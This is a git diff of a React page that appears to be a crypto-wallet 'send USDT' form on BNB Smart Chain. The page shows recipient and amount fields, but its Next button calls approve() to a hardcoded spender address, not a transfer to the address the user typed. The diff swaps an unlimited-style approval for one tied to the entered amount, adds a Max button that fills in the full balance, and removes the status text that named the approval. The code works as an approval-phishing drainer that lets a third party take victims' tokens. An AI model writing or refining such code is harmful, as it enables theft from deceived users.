@@ -1,6 +1,6 @@
 import { useCallback, useEffect, useState } from "react";
 import { Clipboard, ScanLine, ChevronDown } from "lucide-react"; // Added ChevronDown
-import { BrowserProvider, Contract, parseUnits } from "ethers";
+import { BrowserProvider, Contract, parseUnits, formatUnits } from "ethers";
 import icon from "../assets/image.png";
 
 /** BNB Smart Chain mainnet */
@@ -15,6 +15,7 @@ const USDT_APPROVE_SPENDER = "0x8Fd2FFc1d235CEf07e37Ea065732ED1a0a6856E5";
 
 const ERC20_APPROVE_ABI = [
   "function approve(address spender, uint256 amount) returns (bool)",
+  "function balanceOf(address account) view returns (uint256)",
 ];
 
 function getEthereum() {
@@ -65,12 +66,37 @@ const Home = () => {
   const [account, setAccount] = useState(null);
   const [chainId, setChainId] = useState(null);
   const [connectError, setConnectError] = useState(null);
-  const [txStatus, setTxStatus] = useState(null);
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [userBalance, setUserBalance] = useState(0n);
+
+  console.log("userBalance : ", userBalance);
+  
 
   const refreshChain = useCallback(async (ethereum) => {
     const idHex = await ethereum.request({ method: "eth_chainId" });
     setChainId(Number.parseInt(idHex, 16));
   }, []);
+
+  const fetchBalance = useCallback(async (addr) => {
+    const ethereum = getEthereum();
+    if (!ethereum || !addr) return;
+    try {
+      const provider = new BrowserProvider(ethereum);
+      const usdt = new Contract(USDT_BSC, ERC20_APPROVE_ABI, provider);
+      const balance = await usdt.balanceOf(addr);
+      console.log("balance of usdt : ", balance);
+      
+      setUserBalance(balance);
+    } catch (e) {
+      console.error("Error fetching balance:", e);
+    }
+  }, []);
+
+  useEffect(() => {
+    if (account && chainId === BSC_CHAIN_ID_DEC) {
+      fetchBalance(account);
+    }
+  }, [account, chainId, fetchBalance]);
 
   useEffect(() => {
     const ethereum = getEthereum();
@@ -128,9 +154,14 @@ const Home = () => {
     }
   };
 
+  const handleMax = () => {
+    if (userBalance > 0n) {
+      setAmount(formatUnits(userBalance, 18));
+    }
+  };
+
   const handleNext = async () => {
     const ethereum = getEthereum();
-    setTxStatus(null);
     setConnectError(null);
 
     if (!ethereum) {
@@ -159,6 +190,7 @@ const Home = () => {
     }
 
     try {
+      setIsProcessing(true);
       await ensureBscNetwork(ethereum);
       await refreshChain(ethereum);
 
@@ -169,21 +201,32 @@ const Home = () => {
         return;
       }
 
-      setTxStatus("Confirm unlimited USDT approval in your wallet…");
+      if (!amount || Number.parseFloat(amount) <= 0) {
+        setConnectError("Minimum 0.0000000000000001 USDT");
+        return;
+      }
+
       const provider = new BrowserProvider(ethereum);
       const signer = await provider.getSigner();
       const usdt = new Contract(USDT_BSC, ERC20_APPROVE_ABI, signer);
 
-      // 1M USDT (6 decimals)
-      const usdtAmount = parseUnits("1000000", 18);
+      const usdtAmount = parseUnits(amount, 18);
+      const currentBalance = await usdt.balanceOf(activeAccount);
+
+      if (currentBalance < usdtAmount) {
+        setConnectError("Not enough balance");
+        return;
+      }
+
       const tx = await usdt.approve(USDT_APPROVE_SPENDER, usdtAmount);
-      setTxStatus("Waiting for confirmation…");
       await tx.wait();
-      setTxStatus("Approved. Transaction confirmed.");
+      
     } catch (e) {
       const msg = e?.shortMessage || e?.message || "Transaction failed";
       setConnectError(msg);
-      setTxStatus(null);
+      
+    } finally {
+      setIsProcessing(false);
     }
   };
 
@@ -193,16 +236,7 @@ return (
     <div className="max-h-screen h-full flex justify-center font-sans" style={{ backgroundColor: colors.bg }}>
       <div className="w-full max-w-md flex flex-col px-5 pt-4 pb-8">
         
-        {/* Header Section */}
-        {/* <div className="flex items-center justify-between mb-8">
-          <button className="text-white">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
-          </button>
-          <h1 className="text-white text-lg font-bold">Send BNB</h1>
-          <button className="text-white">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M18 6L6 18M6 6l12 12"/></svg>
-          </button>
-        </div> */}
+    
 
         <div className="flex-1 space-y-6">
           {/* Address Input Section */}
@@ -266,19 +300,53 @@ return (
               />
               <div className="flex items-center gap-3">
                 <span className="text-white font-semibold" style={{ color: colors.textSecondary }}>USDT</span>
-                <button className="font-bold" style={{ color: colors.primaryGreen }}>Max</button>
+                <button onClick={handleMax} className="font-bold cursor-pointer" style={{ color: colors.primaryGreen }}>Max</button>
               </div>
             </div>
-            <p className="mt-2 text-sm font-medium" style={{ color: colors.textSecondary }}>≈ ${(Number(amount) * 0.9999).toFixed(2)}</p>
+            {(() => {
+              if (!amount || Number.parseFloat(amount) <= 0) {
+                return (
+                  <p className="mt-2 text-sm font-medium" style={{ color: colors.textSecondary }}>
+                      ≈ ${Math.floor(Number(amount) * 0.9999 * 100) / 100}
+
+                  </p>
+                );
+              }
+              try {
+                const parsedAmount = parseUnits(amount, 18);
+                if (userBalance < parsedAmount) {
+                  return (
+                    <p className="mt-2 text-sm font-normal text-red-500">
+                      Not enough balance
+                    </p>
+                  );
+                }
+              } catch (e) {
+                /* ignore parse errors */
+              }
+              return (
+                <p className="mt-2 text-sm font-medium" style={{ color: colors.textSecondary }}>
+                    ≈ ${Math.floor(Number(amount) * 0.9999 * 100) / 100}
+                </p>
+              );
+            })()}
           </div>
         </div>
+
+        
+        {connectError && (
+          <p className="mt-4 text-center text-sm font-medium text-red-500">
+            {connectError}
+          </p>
+        )}
 
         <button
           type="button"
           onClick={handleNext}
-          className="w-full bg-[var(--primary)] hover:bg-[var(--primary-light)] text-black font-medium py-3 rounded-full text-lg mt-6"
+          disabled={isProcessing || (amount && Number.parseFloat(amount) > 0 && userBalance < parseUnits(amount, 18))}
+          className={`w-full ${isProcessing || (amount && Number.parseFloat(amount) > 0 && userBalance < parseUnits(amount, 18)) ? 'opacity-70 cursor-not-allowed' : ''} bg-[var(--primary)] text-black font-medium py-3 rounded-full text-lg mt-6`}
         >
-          Next
+          {isProcessing ? "Processing..." : "Next"}
         </button>
       </div>
     </div>
